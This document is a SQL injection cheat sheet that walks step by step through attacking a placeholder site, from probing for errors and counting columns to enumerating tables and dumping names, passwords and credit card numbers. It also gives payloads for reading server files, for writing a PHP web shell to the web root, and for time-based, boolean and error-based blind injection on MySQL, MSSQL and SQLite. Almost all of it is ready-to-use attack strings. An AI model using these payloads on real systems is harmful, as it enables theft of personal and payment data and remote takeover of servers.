SQL Injection attack steps(start from -> http://vulnsite.com/clients.php?id=150):

	# Important note! For Sql injection comments (--) to work, you need to include a space at the end (-- ) or (-- -) 

	Step 1: id=150'	-> if sql error is not visible, you need to do blind SQL injection

	Step 2: id=150 order by 1-- -
	# Try to use ;# at the end to comment out the next query
	# Increment the order number until you hit error to find out how many columns there are
	# Say you get an error at 'id=150 order by 9-- -' -> this means there are 8 columns available

	Step 3: id=150 union select 1,2,3,4,5,6,7,8
	# See what column numbers appear on the website somewhere, those are vulnerable
	# Say we only see column 3, 5 and 8 on the screen

	Step 4: id=150 union all select 1,2,user(),4,@@version,6,7,8

	Step 5: id=150 union all select 1,2,3,4,table_name,6,7,8 FROM information_schema.tables
	# extract all tablenames
	# This is the syntax for SQL Server, might not work for other SQL versions

	Step 6: id=150 union all select 1,2,3,4,5,6,7,column_name FROM information_schema.columns where table_name='<tableName>'
	# Say we find table 'clients' with columns 'name', 'password', 'credit_card', 'not_important'

	Step 7: id=150 union select 1,2,name,4,password,6,7,credit_card FROM clients
	# This will dump all the data on the website for us to see
	# (if it's a stored SQL injection, anyone who browses to that page will see the data dump)


Sql injection queries:
	
	Test for vulnerable columns (sometimes you need to limit to 1 result and supply a negative index so we can properly see output):

		syntax : http://vulnerable.org/items?id=-1 union all select <columns> LIMIT 1-- -
		example: http://vulnerable.org/items?id=-1 union all select 1,2,3,4,5,6,7 LIMIT 1-- -


	Load a file's contents if permission is enabled:
		
		syntax : id=150 union all select 1,2,3,4,5,6,7,load_file("<remoteFilePath>")
		example: id=150 union all select 1,2,3,4,5,6,7,load_file("c:\Users\Derrick\Desktop\password.txt")


	Upload a file to a remote server if permission is enabled:
		
		syntax : id=150 union all select 1,2,3,4,"<contents>",6,7,8 into outfile '<outFile>'
		example: id=150 union all select 1,2,3,4,"<?php echo shell_exec($_REQUEST['cmd']);?>",6,7,8 into outfile '/var/www/html/upload.php'


Useful queries per database version:

	MYSQL:
		Blind SQL Injection:
            # time-based
			syntax : ' AND (SELECT CASE WHEN ((SELECT hex(substr(<column>,<index>,1)) FROM <table> LIMIT <offset>,1) = hex('<character>')) THEN sleep(<time>) ELSE 0 END));-- -
			example: ' AND (SELECT CASE WHEN ((SELECT hex(substr(table_name,1,1)) FROM information_schema.tables LIMIT 0,1) = hex('a')) THEN sleep(5) ELSE 0 END));-- -

            # boolean-based
            syntax : ' AND (SELECT CASE WHEN ((SELECT hex(substr(<column>,1,1)) FROM <table> LIMIT <offset>,1) = hex('<character>')) THEN 1 ELSE 0 END));-- -
			example: ' AND (SELECT CASE WHEN ((SELECT hex(substr(table_name,1,1)) FROM information_schema.tables LIMIT 0,1) = hex('a')) THEN 1 ELSE 0 END));-- -

	MSSQL:
        Blind SQL Injection:
            # error-based enumerate readable databases
            syntax : or 1 in (SELECT TOP 1 CAST(db_name(<index>) as varchar(4096)));-- -
            example: or 1 in (SELECT TOP 1 CAST(db_name(1) as varchar(4096)));-- -

            # error-based enumerate database tables
            syntax : or 1 in (SELECT TOP 1 CAST(<column> as varchar(4096)) FROM <database_name>..<table> WHERE xtype='U' and <column> NOT IN (<known_table_list>)); -- -
            example: or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM master..sysobjects WHERE xtype='U' and name NOT IN ('users', 'employees')); -- -

            # error-based enumerate table columns
            syntax : or 1 in (SELECT TOP 1 CAST (<database>..syscolumns.name as varchar(4096)) FROM <database>..syscolumns, <database>..sysobjects WHERE <database>..syscolumns.id=<database>..sysobjects.id
                     AND <database>..sysobjects.name=<table_name> AND <database>..syscolumns.name NOT IN (<known_column_list>)); -- -
            example: or 1 in (SELECT TOP 1 CAST (cms..syscolumns.name as varchar(4096)) FROM cms..syscolumns, cms..sysobjects WHERE cms..syscolumns.id=cms..sysobjects.id
                     AND cms..sysobjects.name=cms_users AND cms..syscolumns.name NOT IN ('id', 'username', 'address')); -- -
            
	SQLITE:
        Blind SQL Injection:
            # boolean-based
            syntax : " AND (SELECT CASE WHEN ((SELECT hex(substr(<column>,<index>,1)) FROM <table> LIMIT <offset>,1) = hex('<character>')) then match(1,1) END))-- -
            example: " AND (SELECT CASE WHEN ((SELECT hex(substr(name,1,1)) FROM sqlite_master LIMIT 0,1) = hex('a')) then match(1,1) END))-- -
